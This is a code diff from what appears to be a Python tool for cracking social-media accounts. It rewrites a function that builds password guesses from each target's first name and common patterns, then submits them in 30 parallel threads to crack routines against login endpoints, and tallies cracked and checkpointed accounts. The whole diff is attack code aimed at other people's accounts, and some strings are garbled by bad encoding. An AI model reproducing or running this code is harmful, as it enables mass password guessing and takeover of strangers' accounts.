@@ -936,39 +936,131 @@ def passwrd():
                 pwv.append(frs+'1992')
                 pwv.append(frs+'1993')
                 pwv.append(frs+'1994')
-                pwv.append(frs+'1995')
-                pwv.append(frs+'1996')
-                pwv.append(frs+'1997')
-                pwv.append(frs+'1998')
-                pwv.append(frs+'1999')
-                pwv.append(frs+'2000')
-            if 'ya' in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
-            if 'mobile' in method:
-                pool.submit(crack, idf, pwv)
-            elif 'free' in method:
-                pool.submit(crackfree, idf, pwv)
-            elif 'touch' in method:
-                pool.submit(cracktouch, idf, pwv)
-            elif 'mbasic' in method:
-                pool.submit(crackmbasic, idf, pwv)
-            else:
-               pool.submit(crackmbasic, idf, pwv)
-
-    مبستi('')
-    cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
-    مبستi(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
-    مبستi(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
-    مبستi('')
-    مبستi('>> Lanjut Crack Kembali ( Y/t ) ? ')
-    woi = input('>> Pilih : ')
-    if woi in ('y', 'Y'):
-        back()
-    else:
-        مبستi(f'''\t{x}[=]{k} Been completed {x} <> ''')
-        time.sleep(2)
-        exit()
+def passwrd():
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append('112233445566')
+					pwv.append('1122334455')
+					pwv.append('1234512345')
+					pwv.append('00998877')
+					pwv.append('0099887766')
+					pwv.append('00009999')
+					pwv.append('07700770')
+					pwv.append('qqwweerrttyy')
+					pwv.append('qqwweerrtt')
+					pwv.append('qqwweerr')
+					pwv.append('ppooiiuu')
+					pwv.append('poiupoiu')
+					pwv.append('ppooiiuuyy')
+					pwv.append('nnnnmmmm')
+					pwv.append('nmnmnmnm')
+					pwv.append('mmmmnnnn')
+					pwv.append('zzzzxxxx')
+					pwv.append('zzxxccvv')
+					pwv.append('zxzxzxzxz')
+					pwv.append('qqqqwwww')
+					pwv.append('qqwweerr')
+					pwv.append('zzzznnnn')
+					pwv.append('ccccvvvv')
+					pwv.append('aaaassss')
+					pwv.append('oooopppp')
+					pwv.append('aassddff')
+					pwv.append('mnbvmnbv')
+					pwv.append('mmnnbbvv')
+					pwv.append('ppppoooo')
+					pwv.append('opopopop')
+					pwv.append('qqwweerr')
+					pwv.append('qqwweerrtt')
+					pwv.append('wwwwqqqq')
+					pwv.append('ssssdddd')
+					pwv.append('qwertyuiop')
+					pwv.append('asdfghjkl')
+					pwv.append('qqqqwwww')
+					pwv.append('qwertqwer')
+					pwv.append('qwertyuiopasdfghjkl')
+					pwv.append('qwertyuiopqwertyuiop')
+					pwv.append('Ù¡Ù¢Ù£Ù¤Ù¥Ù¦Ù§Ù¨Ù©')
+					pwv.append('123456')
+					pwv.append('123456789')
+					pwv.append('123456$$')
+					pwv.append('123@@123')
+					pwv.append('1122334455')
+					pwv.append('11112222')
+					pwv.append('12341234@@')
+					pwv.append('11110000')
+					pwv.append('19901990')
+					pwv.append('19911991')
+					pwv.append('19921992')
+					pwv.append('19931993')
+					pwv.append('19941994')
+					pwv.append('19951995')
+					pwv.append('19961996')
+					pwv.append('19971997')
+					pwv.append('19981998')
+					pwv.append('19991999')
+					pwv.append('20002000')
+					pwv.append('20012001')
+					pwv.append('20022002')
+					pwv.append('20032003')
+					pwv.append('20041004')
+					pwv.append('20052005')
+					pwv.append('20062006')
+					
+					
+					pwv.append('11223344@@')	
+					pwv.append('11223344556677')
+					pwv.append('00998877')
+					
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append('112233445566')
+					pwv.append('1122334455')
+					pwv.append('123412345')
+					pwv.append('11223344@@')	
+					pwv.append('11223344556677')
+					pwv.append('00998877')
+					pwv.append(frs+frs)
+			if 'ya' in pwpluss:
+				for xpwd in pwnya:
+					pwv.append(xpwd)
+			else:pass
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfree,idf,pwv)
+			elif 'touch' in method:
+				pool.submit(cracktouch,idf,pwv)
+			elif 'mbasic' in method:
+				pool.submit(crackmbasic,idf,pwv)
+			else:
+				pool.submit(crackmbasic,idf,pwv)
+	print(f'â”‚ {h} ACC OK : {h}%s '%(ok))
+	print(f'â”‚ {k} ACC CP : {k}%s{x} '%(cp))
+	#print('')
+	print(' Again Crack ( Y/t )  ')
+	woi = input(' Choose : ')
+	if woi in ['y','Y']:
+		back()
+	else:
+		print(f'\t{k} Owner : Decoded By SDM Team - DecodeX ðŸ‘€')
+		time.sleep(2)
+		exit()
 
 
 def crack(idf, pwv):
